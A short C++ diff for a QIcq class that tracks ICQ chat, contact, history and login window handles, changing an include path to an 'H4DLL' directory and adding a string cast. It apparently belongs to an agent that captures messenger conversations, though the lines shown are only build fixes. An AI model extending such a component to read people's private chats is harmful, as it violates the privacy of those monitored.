@@ -13,7 +13,7 @@ using namespace std;
 
 #include "QIcq.h"
 #include "QAgent.h"
-#include "..\common.h"
+#include "../../H4DLL/common.h"
 QIcq::QIcq(HWND hw)
 {
 	hwChat = hwUserList = hwLogin = hwContacts = hwHistory = NULL;
@@ -68,5 +68,5 @@ UINT QIcq::VersionEx(const HWND hw)
 
 const PWCHAR QIcq::GetMessenger()
 { 
-	return L"ICQ"; 
+	return (PWCHAR)L"ICQ";
 }
